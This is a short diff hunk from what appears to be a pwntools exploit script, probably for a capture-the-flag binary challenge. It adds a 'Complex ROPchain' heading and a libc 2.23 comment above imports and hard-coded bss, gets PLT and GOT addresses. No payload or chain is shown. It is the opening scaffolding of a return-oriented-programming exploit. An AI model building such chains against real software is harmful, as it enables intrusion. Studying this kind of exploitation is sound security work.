@@ -1,9 +1,12 @@
+###Complex ROPchain
+
 from pwn import *
 from IO_FILE import *
 
 context.arch = 'amd64'
 
 ###Addr
+#  libc2.23
 bss = 0x601810
 gets_plt=0x400430
 gets_got=0x600ff0
